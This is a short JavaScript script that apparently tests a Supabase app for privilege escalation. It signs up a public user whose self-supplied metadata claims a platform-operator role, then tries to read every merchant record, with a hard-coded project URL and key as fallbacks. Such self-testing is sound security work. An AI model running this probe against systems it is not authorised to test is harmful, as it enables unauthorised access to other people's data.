import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.VITE_SUPABASE_URL || 'https://eilcqznllmnehrmgbjrb.supabase.co';
const SUPABASE_KEY = process.env.VITE_SUPABASE_PUBLISHABLE_KEY || 'sb_publishable_YQXuf1UkhhqRV-_M4ZC6wA_EAA1lTiW';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

async function testEscalation() {
  const timestamp = Date.now();
  const email = `hacker_${timestamp}@guardrail.com`;
  console.log('Attempting public signup with PLATFORM_OPERATOR metadata...');
  
  const { data, error } = await supabase.auth.signUp({
    email,
    password: 'Password123!',
    options: {
      data: {
        account_type: 'PLATFORM_OPERATOR'
      }
    }
  });

  if (error) {
    console.log('Signup failed (Secure):', error.message);
  } else {
    console.log('Signup succeeded! User ID:', data.user?.id);
    
    // Sign in as this user
    const { data: authData, error: signInErr } = await supabase.auth.signInWithPassword({
      email,
      password: 'Password123!'
    });
    
    if (signInErr) {
       console.log('Failed to sign in:', signInErr.message);
       return;
    }

    const authClient = createClient(SUPABASE_URL, SUPABASE_KEY, {
       global: { headers: { Authorization: `Bearer ${authData.session.access_token}` } }
    });

    console.log('Attempting to read all merchants as the escalated user...');
    const { data: merchants, error: fetchErr } = await authClient.from('merchants').select('id, name');
    
    if (fetchErr) {
       console.log('Fetch error:', fetchErr.message);
    } else {
       console.log(`Successfully fetched ${merchants.length} merchants!`);
       if (merchants.length > 0) {
          console.log('CRITICAL VULNERABILITY CONFIRMED: Privilege Escalation Success. User can read all merchants.');
       } else {
          console.log('No merchants fetched, or RLS blocked access (which means the operator role didn\'t work or subquery failed).');
       }
    }
  }
}

testEscalation();
